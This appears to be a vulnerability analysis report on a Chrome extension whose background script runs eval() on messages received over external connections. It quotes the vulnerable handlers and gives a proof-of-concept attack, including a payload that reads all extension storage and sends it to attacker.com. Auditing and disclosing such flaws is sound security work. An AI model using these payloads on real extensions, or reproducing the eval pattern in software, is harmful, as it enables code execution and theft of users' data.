# CoCo Analysis: innlppeljglcjdbheaplceojcapnfbca

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_external_port_onMessage → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/innlppeljglcjdbheaplceojcapnfbca/opgen_generated_files/bg.js
Line 975: var obj = eval(message);
Line 1038: var obj = eval(message);

**Code:**

```javascript
// Background script (bg.js) - External port message handlers

function onWebMessage(id, ext2helper) {
  return function(message) {
    var obj = eval(message);  // ← attacker-controlled code execution
    var cmd = obj.cmd;
    var port = obj.port;
    console.log('ID = ' + id + ' send cmd = ' + cmd + ' to port = ' + port);

    // Handle various commands (e_play, e_stop_success, e_multi_inst, etc.)
    if (cmd === 'e_play') {
      // ...command handling logic
    }
    // ... more command handlers
  }
}

function onNativeMessage(id, ext2web) {
  return function(message) {
    var obj = eval(message);  // ← attacker-controlled code execution
    var port = obj.port;
    var brandVersion = obj.brandVersion;
    console.log('ID = ' + id + ' get port = ' + port + ' get brand version = ' + brandVersion);
    obj.type = 'message';
    try { ext2web.postMessage(obj); } catch (e) { console.log(e); }
  }
}

// These handlers are registered via chrome.runtime.onConnectExternal
// which accepts connections from externally_connectable domains
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External connection via chrome.runtime.connect() from whitelisted domains

**Attack:**

```javascript
// From attacker's page on localhost:* or demo.visualon.info
// (Per manifest.json externally_connectable matches)

// Connect to extension
var port = chrome.runtime.connect("innlppeljglcjdbheaplceojcapnfbca");

// Send malicious code via postMessage
port.postMessage("alert('XSS'); ({cmd: 'e_play', port: 1})");

// Or more dangerous payload:
port.postMessage("chrome.storage.local.get(null, (data) => { fetch('https://attacker.com/exfil', {method: 'POST', body: JSON.stringify(data)}); }); ({cmd: 'dummy'})");

// The eval() will execute attacker's arbitrary JavaScript code
// in the extension's background context with full extension privileges
```

**Impact:** Arbitrary code execution in extension context. Attacker can:
- Execute any JavaScript with extension privileges
- Access native messaging API (nativeMessaging permission)
- Read/write chrome.storage
- Exfiltrate sensitive data
- Perform any action the extension can perform

This is exploitable from localhost (any port) and demo.visualon.info domains per the externally_connectable whitelist in manifest.json. Per methodology, even with domain restrictions, if external connections with eval exist, this is TRUE POSITIVE.
